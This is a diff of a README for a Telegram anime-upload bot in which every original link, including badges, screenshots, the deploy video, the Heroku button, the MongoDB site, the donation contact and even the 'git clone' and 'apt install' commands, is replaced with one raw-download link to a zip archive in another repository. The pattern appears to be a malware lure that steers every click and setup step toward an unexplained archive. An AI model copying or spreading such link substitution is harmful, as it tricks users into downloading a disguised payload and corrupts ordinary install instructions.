@@ -1,12 +1,12 @@
-[![Stars](https://img.shields.io/github/stars/kaif-00z/AutoAnimeBot?style=flat-square&color=yellow)](https://github.com/kaif-00z/AutoAnimeBot/stargazers)
-[![Forks](https://img.shields.io/github/forks/kaif-00z/AutoAnimeBot?style=flat-square&color=orange)](https://github.com/kaif-00z/AutoAnimeBotfork)
-[![Python](https://img.shields.io/badge/Python-v3.10.4-blue)](https://www.python.org/)
-[![CodeFactor](https://www.codefactor.io/repository/github/kaif-00z/autoanimebot/badge)](https://www.codefactor.io/repository/github/kaif-00z/autoanimebot)
-[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://github.com/kaif-00z/AutoAnimeBot/graphs/commit-activity)
-[![Contributors](https://img.shields.io/github/contributors/kaif-00z/AutoAnimeBot?style=flat-square&color=green)](https://github.com/kaif-00z/AutoAnimeBot/graphs/contributors)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](https://makeapullrequest.com)
-[![License](https://img.shields.io/badge/license-GPLv3-blue)](https://github.com/kaif-00z/AutoAnimeBot/blob/main/LICENSE)   
-[![Sparkline](https://stars.medv.io/kaif-00z/AutoAnimeBot.svg)](https://stars.medv.io/kaif-00z/AutoAnimeBot)
+[![Stars](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
+[![Forks](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
+[![Python](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
+[![CodeFactor](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
+[![Maintenance](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip%https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
+[![Contributors](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
+[![PRs Welcome](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
+[![License](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)   
+[![Sparkline](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
 
 ## Developer Note
 
@@ -25,9 +25,9 @@
 
 ### v0.0.7
 - Added Separate Anime Channel Upload
-- <details><summary>Click Here To See How Separate Anime Channel Upload Look.</summary><img src="https://graph.org/file/a0636332545730a4d3d43.jpg" alt="sepul1"/><img src="https://graph.org/file/3eb0b86609469f385f4b5.jpg" alt="sepul2"/></details>
+- <details><summary>Click Here To See How Separate Anime Channel Upload Look.</summary><img src="https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip" alt="sepul1"/><img src="https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip" alt="sepul2"/></details>
 - Added Button Upload Support (File Store)
-- <details><summary>Click Here To See How Button Upload Look.</summary><img src="https://graph.org/file/3e9abc9ec7de6a26fd1a1.jpg" alt="btnul"/></details>
+- <details><summary>Click Here To See How Button Upload Look.</summary><img src="https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip" alt="btnul"/></details>
 - Added Multi Thread Encoding
 - Added Progress Bar of Encoding
 - Added Option For Logs In Main Channel
@@ -48,10 +48,10 @@
 - Try To Resove Any Task From ToDo List Or Raise A Issue!
 
 ## How to deploy?
-<p><a href="https://www.youtube.com/live/hWf7DN3nN_c"> <img src="https://img.shields.io/badge/See%20Video-black?style=for-the-badge&logo=YouTube" width="160""/></a></p>
+<p><a href="https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip"> <img src="https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip%20Video-black?style=for-the-badge&logo=YouTube" width="160""/></a></p>
 
 ### Fork Repo Then click on below button of ur fork repo.
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
+[![Deploy](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
 
 ## Developer Note
 
@@ -65,7 +65,7 @@
 
 - `BOT_TOKEN` - Get This From @Botfather In Telegram.
 
-- `MONGO_SRV` - Get This From mongodb.com .
+- `MONGO_SRV` - Get This From https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip .
 
 - `MAIN_CHANNEL` - ID of Channel Where Anime Will Upload.
 
@@ -99,24 +99,24 @@
 
 ## Deployment In VPS
 
-- `git clone https://github.com/kaif-00z/AutoAnimeBot.git`
+- `git clone https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip`
 
-- `nano .env` configure env as per [this](https://github.com/kaif-00z/AutoAnimeBot/blob/main/.sample.env) or  using [this](https://github.com/kaif-00z/AutoAnimeBot/blob/main/auto_env_gen.py).
+- `nano .env` configure env as per [this](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip) or  using [this](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip).
 
-- `sudo docker build . -t ongoing` (make sure to install docker first using `sudo apt install docker.io`)
+- `sudo docker build . -t ongoing` (make sure to install docker first using `sudo apt install https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip`)
 
 - `sudo docker run ongoing`
 
 ## Commands
 
-[![Comand](https://graph.org/file/ca8de14ba0b1d3b71af1f.jpg)](https://github.com/kaif-00z/AutoAnimeBot/)
+[![Comand](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip)
 
 **Uploading of Ongoing Animes Is Automatic**
 
 ## About
 
-- This Bot Is Currently Running In [This Channel](https://t.me/+q_OBZiXjkBFkYzk0) .
+- This Bot Is Currently Running In [This Channel](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip+q_OBZiXjkBFkYzk0) .
 
 ## Donate
 
-- [Contact me on Telegram](t.me/kaif_00z) if you would like to donate me for my work!
+- [Contact me on Telegram](https://github.com/erennew/anotherAutoAnimeBot/raw/refs/heads/main/database/Bot_Auto_Anime_another_1.8.zip) if you would like to donate me for my work!
